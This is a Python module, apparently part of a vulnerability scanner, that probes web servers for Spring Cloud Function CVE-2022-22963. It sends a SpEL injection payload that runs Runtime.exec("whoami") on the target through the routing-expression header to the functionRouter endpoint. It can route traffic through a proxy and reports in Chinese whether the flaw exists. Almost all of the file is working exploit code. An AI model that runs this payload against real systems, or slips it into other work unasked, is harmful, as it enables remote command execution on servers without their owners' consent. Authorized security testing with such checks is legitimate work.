import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin
import random

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        payload = f'T(java.lang.Runtime).getRuntime().exec("whoami")'
        data = 'test'
        header = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
        'Content-Type': 'application/x-www-form-urlencoded'}
        logging.captureWarnings(True)
        aa1=requests.post(url1+'functionRouter',cookies=s_cookie,data=data,headers=header,proxies=proxies,verify=False, timeout=5)
        if aa1.status_code == 500 and '"error":"Internal Server Error"' in aa1.text:
            cdd='\n[+]漏洞存在\n'+str(aa1.text)
        else:
            cdd='\n[-]漏洞不存在\n'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ Spring CVE-2022-22963 ]\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)